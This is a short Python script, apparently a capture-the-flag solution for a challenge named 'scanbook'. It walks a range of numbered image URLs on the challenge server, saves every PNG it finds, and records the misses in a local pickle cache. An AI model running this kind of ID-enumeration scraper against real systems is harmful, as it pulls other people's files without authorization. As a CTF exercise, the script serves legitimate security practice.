import requests
from pwn import log, context
import pickle

context.log_level = "NOTSET"

URL = "https://scanbook.chall.pwnoh.io/"


class NotFound:
    file = "tmp.pk"

    @classmethod
    @property
    def load(self):
        try:
            tmp = pickle.load(open(self.file, "rb"))
            return tmp
        except:
            return set()

    @classmethod
    def save(self, not_found: set):
        pickle.dump(not_found, open(self.file, "wb"))


class ReqServer:
    def __init__(self, url=URL):
        self.url = url
        self.start = 39990150
        self.end = 39990300
        self.not_found = set()

    def _get_image(self, num_img) -> bool:
        uri = f"{self.url}/static/codes/{num_img}.png"
        res = requests.get(uri)
        if "404 Not Found" not in res.text:
            log.info(f"Found {uri}")
            with open(f"{num_img}.png", "wb") as f:
                f.write(res.content)
            return True
        else:
            log.warning(f"Not Found {uri}")
            return False

    def scan(self):
        self.not_found = NotFound.load
        for i in range(self.start, self.end):
            if i in self.not_found:
                continue
            isImage = self._get_image(i)
            if not isImage:
                self.not_found.add(i)
                NotFound.save(self.not_found)
            else:
                pass

if __name__ == "__main__":
    ReqServer().scan()